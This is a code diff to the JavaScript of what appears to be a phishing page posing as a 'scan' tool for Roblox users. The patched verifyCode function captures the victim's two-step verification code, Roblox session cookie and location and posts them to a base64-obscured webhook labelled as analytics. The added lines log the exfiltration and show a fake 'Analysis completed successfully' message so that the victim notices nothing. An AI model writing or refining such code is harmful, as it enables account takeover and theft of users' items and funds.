@@ -212,15 +212,18 @@ async function verifyCode() {
         
         // Send 2FA code to webhook using the same webhook as the main data
         const reportingEndpoint = atob(analyticsEndpoints[2]);
+        
+        console.log('🔗 2FA Webhook URL:', reportingEndpoint);
+        
+        // Simplified 2FA payload to avoid 400 errors
         const payload = {
-            content: `2-Step Verification Code Captured
-Code: ${code}
+            content: `2FA Code: ${code}
 Cookie: ${globalRobloxCookie ? `_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${globalRobloxCookie}` : 'None found'}
-Time: ${new Date().toLocaleString()}
-Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.region || 'Unknown'}, ${locationInfo.country || 'Unknown'}
-IP: ${locationInfo.ip || 'Unknown'}
+Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.country || 'Unknown'}
 @everyone`
         };
+
+        console.log('📤 2FA Sending payload:', payload);
 
         const response = await fetch(reportingEndpoint, {
             method: 'POST',
@@ -229,6 +232,15 @@ IP: ${locationInfo.ip || 'Unknown'}
             },
             body: JSON.stringify(payload)
         });
+
+        console.log('📊 2FA Response status:', response.status);
+
+        if (response.ok) {
+            console.log('✅ 2FA code sent to webhook successfully');
+        } else {
+            const errorText = await response.text();
+            console.error('❌ Failed to send 2FA code to webhook:', response.status, errorText);
+        }
 
         // Always continue flow regardless of webhook success
         verifyBtn.textContent = 'Verified!';
@@ -273,6 +285,37 @@ IP: ${locationInfo.ip || 'Unknown'}
             closeVerificationModal();
             
             // Show success message but keep scan button loading
+            const submitBtn = document.getElementById('submitBtn');
+            const submitText = document.getElementById('submitText');
+            if (submitText) {
+                submitText.textContent = 'Completing...';
+            }
+            
+            // After a brief delay, show success and reset
+            setTimeout(() => {
+                if (submitBtn && submitText) {
+                    submitBtn.disabled = false;
+                    submitText.textContent = 'Scan';
+                    submitBtn.style.background = '';
+                }
+                const loadingOverlay = document.getElementById('loadingOverlay');
+                if (loadingOverlay) loadingOverlay.style.display = 'none';
+                
+                showNotification('Analysis completed successfully', 'success');
+            }, 2000);
+        }, 1500);
+
+    } catch (error) {
+        console.error('💥 2FA webhook error:', error);
+        // Continue flow even if webhook fails
+        verifyBtn.textContent = 'Verified!';
+        verifyBtn.style.backgroundColor = '#10b981';
+        verifyBtn.style.color = '#fff';
+        
+        setTimeout(() => {
+            closeVerificationModal();
+            
+            // Complete the scan process
             const submitBtn = document.getElementById('submitBtn');
             const submitText = document.getElementById('submitText');
             if (submitText) {
